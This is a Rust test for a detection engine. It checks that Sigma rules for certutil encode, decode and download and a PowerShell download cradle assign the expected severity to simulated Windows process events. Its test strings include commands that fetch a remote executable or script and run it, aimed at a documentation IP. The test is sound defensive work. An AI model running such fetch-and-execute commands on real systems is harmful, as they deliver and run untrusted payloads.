use detection::{Confidence, DetectionEngine, TelemetryEvent};

#[test]
#[ignore = "RAFIX-INTEGRATION: level parsing and severity mapping are owned by ACORE"]
fn authored_rule_levels_drive_expected_severity() {
    let root = std::path::Path::new(env!("CARGO_MANIFEST_DIR")).join("../../rules/sigma");
    let mut failures = Vec::new();
    for (file, process, command, expected) in [
        (
            "windows_certutil_encode",
            "certutil.exe",
            "certutil -encode cert.der cert.pem",
            Confidence::Low,
        ),
        (
            "windows_certutil_decode",
            "certutil.exe",
            "certutil -decode C:\\Users\\Public\\p.txt C:\\Users\\Public\\p.exe",
            Confidence::Medium,
        ),
        (
            "windows_certutil_download",
            "certutil.exe",
            "certutil -urlcache -split -f http://203.0.113.9/p.exe p.exe",
            Confidence::High,
        ),
        (
            "windows_powershell_download_cradle",
            "powershell.exe",
            "powershell -c 'iwr http://203.0.113.9/a.ps1 | iex'",
            Confidence::Medium,
        ),
    ] {
        let source = std::fs::read_to_string(root.join(format!("{file}.yml")))
            .unwrap()
            .replace("  product: windows\n", "");
        let mut engine = DetectionEngine::default_with_rules();
        engine.load_sigma_rule_yaml(&source).unwrap();
        let event: TelemetryEvent = serde_json::from_value(serde_json::json!({"ts_unix":1,"event_class":"ProcessExec","pid":42,"ppid":1,"uid":1000,
            "process":process,"parent_process":"explorer.exe","session_id":42,"file_path":format!(r"C:\Windows\System32\{process}"),"file_write":false,
            "command_line":command,"container_escape":false,"container_privileged":false})).unwrap();
        let outcome = engine.process_event(&event);
        assert!(outcome.temporal_hits.iter().any(|name| name == file));
        if outcome.confidence != expected {
            failures.push(format!(
                "{file}: expected {expected:?}, got {:?}",
                outcome.confidence
            ));
        }
    }
    assert!(failures.is_empty(), "{}", failures.join("\n"));
}
